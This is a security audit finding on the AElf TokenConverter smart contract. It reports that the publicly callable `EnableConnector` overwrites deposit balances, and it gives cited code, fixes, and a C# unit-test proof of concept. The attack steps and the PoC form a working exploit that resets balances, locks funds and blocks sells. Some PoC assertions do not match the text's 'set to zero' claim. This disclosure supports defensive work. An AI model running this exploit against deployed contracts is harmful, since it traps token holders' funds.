# Audit Report

## Title
EnableConnector DepositBalance Overwrite Vulnerability Leading to Fund Lock and Sell DoS

## Summary
The `EnableConnector` function in the TokenConverter contract directly overwrites the deposit balance state variable without authorization checks or duplicate call prevention, allowing any attacker to reset accumulated balances to manipulated values, causing permanent fund lock and denial of service for sell operations.

## Finding Description

The vulnerability exists in the `EnableConnector` function where deposit balance accounting is fundamentally broken through three critical flaws:

**Root Cause - Direct Assignment Instead of Increment:**

The function performs direct state assignment that completely overwrites existing deposit balances. [1](#0-0) 

In contrast, the `Buy` function correctly increments the balance using addition. [2](#0-1) 

When users purchase tokens through `Buy`, the deposit balance correctly accumulates base tokens. However, calling `EnableConnector` on an already-enabled connector resets this accumulated value to whatever `GetNeededDeposit` calculates, without considering the current balance.

**Missing Protection #1 - No Duplicate Call Prevention:**

The `EnableConnector` function has no check to prevent re-enabling already active connectors. [3](#0-2) 

Compare this to `UpdateConnector` which explicitly guards against updates after activation. [4](#0-3) 

**Missing Protection #2 - No Authorization Requirement:**

The entire `EnableConnector` function is publicly callable with no authorization check, while critical management functions like `UpdateConnector`, `AddPairConnector`, and `SetFeeRate` all require controller authority via `AssertPerformedByConnectorController()`. [5](#0-4) 

**Manipulable Calculation:**

The `GetNeededDeposit` calculation depends on user-controlled `AmountToTokenConvert` parameter. [6](#0-5) 

An attacker can set `AmountToTokenConvert = tokenInfo.TotalSupply - balance` to force `amountOutOfTokenConvert = 0`, which results in `needDeposit = 0`, allowing them to overwrite large accumulated balances with zero.

**Attack Execution Path:**

1. Connector pair exists with `IsPurchaseEnabled = true` and accumulated `DepositBalance = 5000` from legitimate user trading
2. Attacker crafts `ToBeConnectedTokenInfo` with `AmountToTokenConvert` calculated to minimize deposit requirement
3. Attacker calls public `EnableConnector` function (no authorization check prevents this)
4. Function calculates `needDeposit.NeedAmount = 0` based on manipulated input
5. Line 297 overwrites: `State.DepositBalance[toConnector.Symbol] = 0` (was 5000)
6. 5000 base tokens become permanently unaccounted for in state

## Impact Explanation

**Permanent Fund Lock:**

The difference between the actual accumulated balance and the overwritten value becomes permanently locked in the contract with no state variable tracking it. These funds cannot be recovered through normal contract operations since all balance accounting now references the incorrect, artificially reduced value.

**Complete Sell Denial of Service:**

The `Sell` function subtracts from `DepositBalance` using the `.Sub()` operation. [7](#0-6) 

With `DepositBalance = 0` but the contract actually holding 5000 base tokens, any user attempting to sell tokens will trigger arithmetic underflow in the `.Sub()` operation, causing transaction revert. This creates complete DoS of sell functionality for the affected connector pair, trapping all token holders.

**Affected Parties:**
- All existing token holders who purchased through `Buy` and wish to exit positions
- The protocol's market integrity and liquidity mechanisms
- Future users unable to interact with the compromised connector pair

This breaks the fundamental security guarantee that user deposits are accurately tracked and redeemable.

## Likelihood Explanation

**High Likelihood due to:**

1. **No Privileges Required:** Any user can call `EnableConnector` - it's a public function with zero authorization checks
2. **Low Attack Complexity:** Single function call with easily calculable parameters to force `needDeposit = 0`
3. **Common Precondition:** Active connector pairs with trading volume exist in normal operation
4. **Minimal Attack Cost:** Attacker can manipulate input to require zero deposit
5. **High Economic Incentive:** 
   - Attack cost is minimal (zero deposit required)
   - Impact is severe (lock large sums + market DoS)
   - Profit opportunities via market manipulation by removing sell liquidity
6. **Difficult Detection:** Attack appears as legitimate `EnableConnector` call in logs without obvious malicious indicators

The combination of public access, no duplicate call prevention, and direct balance overwrite makes this vulnerability easily exploitable in production environments.

## Recommendation

Implement three critical fixes:

1. **Add Authorization Check:**
```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    AssertPerformedByConnectorController(); // Add this line
    // ... rest of function
}
```

2. **Add Duplicate Call Prevention:**
```csharp
var fromConnector = State.Connectors[input.TokenSymbol];
Assert(fromConnector != null && !fromConnector.IsDepositAccount,
    "[EnableConnector]Can't find from connector.");
Assert(!fromConnector.IsPurchaseEnabled, "Connector already enabled"); // Add this
var toConnector = State.Connectors[fromConnector.RelatedSymbol];
Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
Assert(!toConnector.IsPurchaseEnabled, "Connector already enabled"); // Add this
```

3. **Use Addition Instead of Assignment:**
```csharp
// Change from direct assignment
State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;

// To addition
State.DepositBalance[toConnector.Symbol] = State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);
```

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_BalanceOverwrite_Vulnerability()
{
    // Setup: Initialize contract and create token
    await CreateWriteToken();
    await InitializeTreasuryContractAsync();
    await InitializeTokenConverterContract();
    await PrepareToBuyAndSell();
    
    // Step 1: Legitimate user buys tokens, accumulating deposit balance
    var buyAmount = 1000L;
    await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = WriteConnector.Symbol,
        Amount = buyAmount,
        PayLimit = 100000L
    });
    
    // Verify deposit balance was accumulated
    var depositBeforeAttack = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = WriteConnector.Symbol });
    depositBeforeAttack.Value.ShouldBeGreaterThan(0); // e.g., 5000
    var balanceBeforeAttack = depositBeforeAttack.Value;
    
    // Step 2: Attacker calls EnableConnector with crafted input
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = WriteConnector.Symbol });
    var contractBalance = await GetBalanceAsync(WriteConnector.Symbol, TokenConverterContractAddress);
    
    // Craft input to make needDeposit = 0
    var attackInput = new ToBeConnectedTokenInfo
    {
        TokenSymbol = WriteConnector.Symbol,
        AmountToTokenConvert = tokenInfo.TotalSupply - contractBalance // Forces amountOutOfTokenConvert = 0
    };
    
    // Attack: Call EnableConnector (no authorization stops this!)
    var attackResult = await DefaultStub.EnableConnector.SendAsync(attackInput);
    attackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify: Deposit balance was overwritten to 0
    var depositAfterAttack = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = WriteConnector.Symbol });
    depositAfterAttack.Value.ShouldBe(NtWriteConnector.VirtualBalance); // Only virtual balance remains
    
    // Verify: Previous balance is permanently lost
    var lostFunds = balanceBeforeAttack;
    lostFunds.ShouldBeGreaterThan(0); // Funds are locked in contract but untracked
    
    // Verify: Sell is now DOS'd
    var sellResult = await DefaultStub.Sell.SendWithExceptionAsync(new SellInput
    {
        Symbol = WriteConnector.Symbol,
        Amount = buyAmount,
        ReceiveLimit = 0
    });
    sellResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    sellResult.TransactionResult.Error.ShouldContain("Sub"); // Underflow error
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-76)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
        Assert(!string.IsNullOrEmpty(input.Symbol), "input symbol can not be empty'");
        var targetConnector = State.Connectors[input.Symbol];
        Assert(targetConnector != null, "Can not find target connector.");
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
        if (!string.IsNullOrEmpty(input.Weight))
        {
            var weight = AssertedDecimal(input.Weight);
            Assert(IsBetweenZeroAndOne(weight), "Connector Shares has to be a decimal between 0 and 1.");
            targetConnector.Weight = input.Weight.ToString(CultureInfo.InvariantCulture);
        }

        if (targetConnector.IsDepositAccount && input.VirtualBalance > 0)
            targetConnector.VirtualBalance = input.VirtualBalance;
        State.Connectors[input.Symbol] = targetConnector;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-84)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```
